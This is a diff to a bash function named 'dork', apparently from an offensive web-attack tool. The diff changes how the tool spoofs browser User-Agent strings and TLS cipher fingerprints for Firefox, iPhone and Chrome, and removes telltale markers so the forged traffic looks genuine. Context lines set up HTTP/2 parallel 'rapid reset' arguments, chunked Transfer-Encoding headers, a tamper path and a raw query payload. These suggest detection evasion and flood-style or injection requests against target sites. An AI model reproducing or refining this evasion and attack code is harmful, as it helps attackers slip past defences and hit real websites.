@@ -145,21 +145,20 @@ dork() {
           local target_tls13=""
           local rapid_reset_args="--http2 --parallel --parallel-max 50"
           local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
-          if [[ "$base_ua" == *"Firefox"* ]]; then
-
-            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
+                    if [[ "$base_ua" == *"Firefox"* ]]; then
+            
+            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
+             target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
 
           elif [[ "$base_ua" == *"iPhone"* ]]; then
-            random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
 
+            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
           else
-
-            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
+            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
             target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
           fi
           local defiance_tamper_path=""
@@ -229,22 +228,24 @@ dork() {
             local target_tls13=""
             local rapid_reset_args="--http2 --parallel --parallel-max 50"
             local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
-            if [[ "$base_ua" == *"Firefox"* ]]; then
-              random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
-              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
-              target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
+                      if [[ "$base_ua" == *"Firefox"* ]]; then
+            
+            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
+             target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
 
-            elif [[ "$base_ua" == *"iPhone"* ]]; then
-              random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
-              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
-              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
+          elif [[ "$base_ua" == *"iPhone"* ]]; then
+            
+            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
 
-            else
-              random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
-              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
-              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-            fi
-
+          else
+            
+            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
+             target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+          fi
             local defiance_tamper_path=""
             local final_query=""
             local raw_payload="$query_payload"
